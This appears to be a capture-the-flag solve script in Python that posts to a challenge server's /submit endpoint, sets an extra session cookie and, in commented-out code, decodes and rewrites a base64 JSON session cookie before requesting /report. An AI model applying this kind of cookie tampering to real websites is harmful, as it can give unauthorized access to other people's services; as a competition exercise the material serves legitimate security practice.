import requests
import base64
import json
s = requests.Session() 
# all cookies received will be stored in the session object

stepone = s.post('http://chals.ctf.sg:30601/submit',data={"confession":'a'})
print(stepone.text)



def process(s):
    '''
    data = json.loads(base64.b64decode(s.cookies['session'].encode()))
    #data['hi'] = 'noU'
    print(data)
    d = base64.b64encode(json.dumps(data).encode()).decode()
    #print(d)
    s.cookies['session'] = d
    '''
    s.cookies['d'] = '1'

process(s)
print(s.cookies) # Mutable object

steptwo = s.get('http://chals.ctf.sg:30601/report')
print(steptwo.text)


